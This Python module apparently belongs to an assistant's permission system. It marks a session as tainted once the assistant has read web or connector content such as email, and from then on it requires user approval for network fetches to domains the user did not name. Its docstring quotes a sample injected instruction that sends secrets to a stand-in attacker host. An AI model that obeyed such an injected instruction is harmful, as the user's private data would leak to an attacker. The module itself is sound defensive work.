"""Taint tracking and egress checks (PLAN.md §7.5; issue #18).

Once the session has taken in untrusted content, an injected instruction in it could try to send my data
somewhere ("fetch https://evil.example/?d=<secrets>"). So after that, every network-egress tool asks,
unless the domain is one I said myself.

- **Sources:** results of connector tools (email, chat, calendar, documents…) and of the web tools
  themselves; later phases add screen context, the clipboard and drops (`mark`).
- **Sticky for the session,** not just the turn: what Claude has read stays in its context for every later
  turn. (PLAN.md §7.5 says "turn"; the session is the safer reading.)
- **Egress:** `WebFetch` and `WebSearch` now (later `open_url`, `show_image` with a URL). An ALLOW becomes ASK
  with a reason the card shows.
"""
from __future__ import annotations

import re
from urllib.parse import urlparse

from .policy import Decision, Policy

EGRESS = frozenset({"WebFetch", "WebSearch"})
WEB = frozenset({"WebFetch", "WebSearch"})

_DOMAIN = re.compile(r"\b((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24})\b", re.IGNORECASE)


def domains_in(text: str) -> set[str]:
    """Domains I mentioned: 'github.com', 'https://docs.python.org/3/' → {'github.com', 'docs.python.org'}."""
    return {m.group(1).lower().rstrip(".") for m in _DOMAIN.finditer(text or "")}


def host_of(url: str) -> str:
    try:
        return (urlparse(url).hostname or "").lower()
    except ValueError:
        return ""


def connector_source(tool: str) -> str | None:
    """'mcp__claude_ai_Gmail__search_threads' → 'Gmail'. Any MCP tool's result is outside content."""
    m = re.match(r"^mcp__(?:claude_ai_)?(.+?)__", tool)
    return m.group(1).replace("_", " ") if m else None


class Taint:
    def __init__(self) -> None:
        self.sources: set[str] = set()
        self.user_domains: set[str] = set()

    @property
    def tainted(self) -> bool:
        return bool(self.sources)

    def mark(self, source: str) -> None:
        self.sources.add(source)

    def user_said(self, text: str) -> None:
        self.user_domains |= domains_in(text)

    def observe(self, tool: str) -> None:
        """A tool is about to run: if its result is untrusted content, the session is tainted from now on."""
        if tool in WEB:
            self.mark("the web")
        elif src := connector_source(tool):
            self.mark(src)

    def user_named(self, host: str) -> bool:
        return bool(host) and any(host == d or host.endswith("." + d) for d in self.user_domains)

    def adjust(self, tool: str, tool_input: dict, d: Decision) -> Decision:
        """Make an egress ALLOW into ASK when tainted, unless I named the domain myself."""
        if not self.tainted or tool not in EGRESS or d.policy is not Policy.ALLOW:
            return d
        if tool == "WebFetch" and self.user_named(host_of(str(tool_input.get("url", "")))):
            return d
        why = f"this conversation has read outside content ({', '.join(sorted(self.sources))}), so going online needs approval"
        return Decision(Policy.ASK, why)
